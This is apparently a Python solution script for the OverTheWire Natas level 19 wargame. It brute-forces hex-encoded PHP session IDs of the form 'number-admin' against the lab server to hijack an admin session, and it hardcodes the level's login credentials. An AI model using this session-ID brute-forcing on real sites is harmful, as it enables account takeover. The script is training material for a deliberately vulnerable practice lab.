import requests
from string import *


c = 641
username = "natas19"
password = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"
url = f"http://{username}.natas.labs.overthewire.org/"
id = ""

session = requests.Session()


def get_id(seen_id):
    for i in range(c):
        i = str(i)
        l = i.encode().hex()+ "2d" + "admin".encode().hex()
        response = session.post(url, auth=(username, password), cookies={'PHPSESSID': f'{l}'})
        if "You are an admin." in response.text:
            print("Found id:", l)
            seen_id = l
            
        else:
            print("Not found:", l)
    return seen_id

pw = get_id(id)
print("Password:", pw)